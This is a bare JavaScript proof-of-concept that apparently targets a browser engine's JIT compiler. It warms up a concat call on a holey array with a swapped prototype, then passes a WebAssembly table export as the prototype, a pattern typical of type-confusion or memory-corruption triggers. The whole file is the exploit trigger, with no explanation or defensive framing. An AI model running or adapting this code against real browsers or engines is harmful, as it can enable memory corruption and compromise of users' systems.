function poc(proto) {
  let a = [1.1];
  a.length = 1;
  delete a[0];
  Object.setPrototypeOf(a, proto);
  return [].concat(a);
}

const p = {};
for (let i = 0; i < 20000; i++) {
  poc(p);
}

const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 4, 4, 1, 112, 1, 1, 111, 7, 5, 1, 1, 116, 1, 0]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const wasm_proto = wasm_instance.exports.t;

poc(wasm_proto);